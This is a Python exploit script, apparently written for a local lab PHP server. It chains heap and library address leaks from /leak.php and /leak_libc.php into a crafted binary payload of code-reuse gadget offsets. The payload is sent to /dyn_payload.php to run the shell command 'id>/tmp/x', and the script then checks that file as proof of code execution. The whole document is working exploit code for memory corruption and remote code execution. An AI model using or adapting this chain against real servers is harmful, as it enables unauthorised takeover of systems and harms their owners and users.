#!/usr/bin/env python3
import urllib.request, urllib.error, re, struct, os, sys, time
from collections import Counter
BASE = os.environ.get('BASE', 'http://127.0.0.1:8088')
def get(path, timeout=15):
    return urllib.request.urlopen(BASE + path, timeout=timeout).read()
def parse775(buf):
    m = re.search(rb's:775:"', buf)
    if not m: raise RuntimeError('no 775 marker')
    p = buf[m.end():m.end()+775]
    c = Counter()
    for i in range(len(p)-7):
        v = struct.unpack_from('<Q', p, i)[0]
        if (v >> 48) == 0 and (((v >> 44) & 0xf) in (5,6,7)) and ((v >> 32) & 0xffff) != 0:
            c[v & ~0x1fffff] += 1
    if not c: raise RuntimeError('no heap ptrs')
    return c.most_common(1)[0][0]
def parse_libphp(buf):
    m = re.search(rb's:32768:"', buf)
    if not m: raise RuntimeError('no 32768 marker')
    p = buf[m.end():m.end()+32768]
    anchor = struct.unpack_from('<Q', p, 8168)[0]
    return anchor - 0x5b6309, anchor
def build(S, LB):
    b = bytearray(320)
    def q(o,v): b[o:o+8] = struct.pack('<Q', v)
    def d(o,v): b[o:o+4] = struct.pack('<I', v)
    q(0x60, S+0x80); q(0x68, 0x307)
    d(0x80,1); d(0x84,7); d(0x88,16); d(0x8c,0xfffffff8)
    q(0x90, S+0xa0); d(0x98,1); d(0x9c,1); d(0xa0,8); d(0xa4,0); q(0xa8,0)
    q(0xb0, LB+0x21ef23)
    q(0xc0,0); q(0xc8, LB+0x15e492); q(0xd0, S+0x120)
    q(0xd8, LB+0x15d1a3); q(0xe0, S+0x130)
    q(0xe8, LB+0x15a029); q(0xf0, LB+0x1504d0); q(0xf8, LB+0x155780); q(0x100,0)
    b[0x120:0x12a] = b'id>/tmp/x\x00'
    b[0x130:0x132] = b'r\x00'
    return b.hex()
try:
    hb = parse775(get('/leak.php'))
    lb, anchor = parse_libphp(get('/leak_libc.php?mode=file_first'))
    S = hb + 0x3780
    p = build(S, lb)
    print('anchor',hex(anchor),'hb',hex(hb),'lb',hex(lb),'S',hex(S))
    url = '/dyn_payload.php?p=' + p
    print('url_len', len(url), 'plen', len(p), 'pstart', p[:24], 'pend', p[-24:])
    try:
        r = get(url, timeout=10)
        print('dyn resp len', len(r))
    except urllib.error.HTTPError as e:
        print('dyn HTTPError', e.code, e.read()[:200])
    except Exception as e:
        print('dyn request exception:', repr(e))
    time.sleep(0.4)
    if os.path.exists('/tmp/x') and os.path.getsize('/tmp/x') > 0:
        print('PROOF:', open('/tmp/x').read().strip())
    else:
        print('NO PROOF')
except Exception as e:
    print('FAIL:', repr(e)); sys.exit(1)
